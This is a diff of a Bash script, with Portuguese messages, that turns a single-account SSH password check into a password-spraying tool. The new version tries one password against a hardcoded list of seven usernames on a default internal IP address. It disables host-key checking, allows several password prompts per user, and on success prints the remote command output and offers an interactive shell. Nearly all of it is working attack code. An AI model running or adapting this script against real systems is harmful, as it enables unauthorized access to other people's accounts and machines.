@@ -2,9 +2,19 @@
 set -euo pipefail
 
 SSH_BIN="${SSH_BIN:-/tmp/openssh-root/usr/bin/ssh}"
-TARGET="${1:-}"
-USER_NAME="${2:-}"
-REMOTE_CMD="${3:-whoami}"
+TARGET="${1:-10.20.20.57}"
+REMOTE_CMD="${2:-whoami}"
+MAX_PROMPTS="${MAX_PROMPTS:-3}"
+
+USERS=(
+  "jonasf"
+  "nickj"
+  "joshuaa"
+  "joaos"
+  "leonardz"
+  "anneh"
+  "dmitrip"
+)
 
 if [[ ! -x "${SSH_BIN}" ]]; then
   echo "[!] SSH nao encontrado em ${SSH_BIN}"
@@ -18,15 +28,7 @@ if ! command -v setsid >/dev/null 2>&1; then
   exit 1
 fi
 
-if [[ -z "${TARGET}" ]]; then
-  read -r -p "Alvo (IP/host): " TARGET
-fi
-
-if [[ -z "${USER_NAME}" ]]; then
-  read -r -p "Usuario: " USER_NAME
-fi
-
-read -r -s -p "Senha: " PASSWORD
+read -r -s -p "Senha para testar em todos os usuarios: " PASSWORD
 echo
 
 if [[ -z "${PASSWORD}" ]]; then
@@ -34,7 +36,7 @@ if [[ -z "${PASSWORD}" ]]; then
   exit 1
 fi
 
-ASKPASS_FILE="/tmp/.askpass_${USER_NAME}_$$.sh"
+ASKPASS_FILE="/tmp/.askpass_all_users_$$.sh"
 cleanup() {
   rm -f "${ASKPASS_FILE}"
 }
@@ -46,28 +48,53 @@ printf '%s\n' '${PASSWORD}'
 EOF
 chmod 700 "${ASKPASS_FILE}"
 
-echo "[*] Testando ${USER_NAME}@${TARGET} com comando remoto: ${REMOTE_CMD}"
-set +e
-DISPLAY=:0 SSH_ASKPASS="${ASKPASS_FILE}" SSH_ASKPASS_REQUIRE=force \
-setsid "${SSH_BIN}" \
-  -o StrictHostKeyChecking=no \
-  -o UserKnownHostsFile=/dev/null \
-  -o PreferredAuthentications=password \
-  -o PubkeyAuthentication=no \
-  -o NumberOfPasswordPrompts=1 \
-  -o ConnectTimeout=6 \
-  "${USER_NAME}@${TARGET}" "${REMOTE_CMD}"
-RC=$?
-set -e
+echo "[*] Alvo: ${TARGET}"
+echo "[*] Comando remoto de teste: ${REMOTE_CMD}"
+echo "[*] Tentativas por usuario: ${MAX_PROMPTS}"
+echo
 
-if [[ ${RC} -eq 0 ]]; then
-  echo "[+] Autenticacao/execucao com sucesso."
-else
-  echo "[-] Falhou (rc=${RC})."
+FOUND_USER=""
+for user in "${USERS[@]}"; do
+  echo "[*] Testando ${user}@${TARGET} ..."
+  set +e
+  output="$(
+    DISPLAY=:0 SSH_ASKPASS="${ASKPASS_FILE}" SSH_ASKPASS_REQUIRE=force \
+      setsid "${SSH_BIN}" \
+        -o StrictHostKeyChecking=no \
+        -o UserKnownHostsFile=/dev/null \
+        -o PreferredAuthentications=password \
+        -o PubkeyAuthentication=no \
+        -o NumberOfPasswordPrompts="${MAX_PROMPTS}" \
+        -o ConnectTimeout=6 \
+        "${user}@${TARGET}" "${REMOTE_CMD}" 2>&1
+  )"
+  rc=$?
+  set -e
+
+  if [[ ${rc} -eq 0 ]]; then
+    echo "[+] SUCESSO: senha valida para ${user}"
+    echo "[i] Saida remota:"
+    echo "${output}"
+    FOUND_USER="${user}"
+    break
+  fi
+
+  if printf '%s' "${output}" | grep -qi "Permission denied"; then
+    echo "[-] Falhou para ${user} (senha invalida)."
+  else
+    echo "[!] Inconclusivo para ${user} (rc=${rc})."
+    echo "${output}"
+  fi
+  echo
+done
+
+if [[ -z "${FOUND_USER}" ]]; then
+  echo "[-] Nenhum usuario autenticou com essa senha."
+  exit 1
 fi
 
 echo
-read -r -p "Abrir sessao interativa agora? [s/N]: " OPEN_INTERACTIVE
+read -r -p "Abrir sessao interativa com ${FOUND_USER}? [s/N]: " OPEN_INTERACTIVE
 if [[ "${OPEN_INTERACTIVE}" =~ ^[sS]$ ]]; then
   exec env DISPLAY=:0 SSH_ASKPASS="${ASKPASS_FILE}" SSH_ASKPASS_REQUIRE=force \
     setsid "${SSH_BIN}" -tt \
@@ -75,5 +102,6 @@ if [[ "${OPEN_INTERACTIVE}" =~ ^[sS]$ ]]; then
       -o UserKnownHostsFile=/dev/null \
       -o PreferredAuthentications=password \
       -o PubkeyAuthentication=no \
-      "${USER_NAME}@${TARGET}"
+      "${FOUND_USER}@${TARGET}"
 fi
+
